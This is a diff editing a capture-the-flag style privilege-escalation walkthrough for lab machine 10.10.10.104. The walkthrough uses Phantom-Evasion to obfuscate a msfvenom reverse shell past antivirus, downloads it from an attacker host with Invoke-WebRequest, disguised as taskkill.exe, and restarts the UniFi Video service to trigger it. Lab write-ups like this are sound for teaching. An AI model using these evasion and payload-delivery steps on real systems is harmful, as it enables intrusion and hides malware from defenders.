@@ -164,7 +164,7 @@ will help obfuscate code of our reverse shell so antivirus can't recognize and b
 
 Start the script
 
-/Phantom-Evasion# `python phantom-evasion.py`
+`python ~/Phantom-Evasion/phantom-evasion.py`
 
 We will use following options.
 1 windows modules ,
@@ -173,7 +173,7 @@ We will use following options.
 
 ![phantom2](/assets/phantom2-10.10.10.104.png)
 
-here we choose Msfvenom
+here we choose msfvenom
 
 payload: `windows/shell_reverse_tcp`
 
@@ -181,8 +181,8 @@ And for encoding option 4: `x86/xor_dynamic + Triple Multibyte-key xor`
 
 ![phantom3](/assets/phantom3-10.10.10.104.png)
 
-for multi processes behaviour , stripping and signing the executable we choose not to do that
-This time when we upload the file it will work
+for multi processes behaviour, stripping and signing the executable we choose not to do that.
+
 
 Again, serve contents of our folder with python `python -m SimpleHTTPServer 80`
 
@@ -190,9 +190,11 @@ and upload taskkill.exe file to C:\ProgramData\unifi-video\
 
 `Invoke-WebRequest -o C:\ProgramData\unifi-video\taskkill.exe http://10.10.14.19/taskkill.exe`
 
+This time when we upload the file it will work.
 
 Lets restart service and see what is going on:
-Restart-Service -Name "Ubiquiti UniFi Video"
+
+`Restart-Service -Name "Ubiquiti UniFi Video"`
 
 ![Restart Service](/assets/restart-service-10.10.10.104.png)
 
